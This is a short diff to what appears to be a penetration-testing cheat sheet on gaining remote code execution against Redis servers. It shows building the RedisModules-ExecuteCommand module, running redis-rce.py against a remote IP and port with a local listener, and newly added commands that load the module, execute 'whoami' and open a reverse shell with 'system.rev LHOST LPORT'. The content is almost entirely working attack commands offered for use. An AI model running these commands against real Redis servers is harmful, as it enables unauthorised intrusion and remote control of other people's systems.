@@ -15,3 +15,12 @@ cd RedisModules-ExecuteCommand
 make
 python3 redis-rce.py -r <remote-ip> -p <port> -L <local-ip> -f ../RedisModules-ExecuteCommand/module.so
 ```
+
+## Load Module
+
+```
+MODULE LOAD /path/to/module.so
+system.exec "whoami"
+system.rev LHOST LPORT
+```
+[HINT](https://www.youtube.com/watch?v=LlzpyGcA-ak&ab_channel=Tech69)
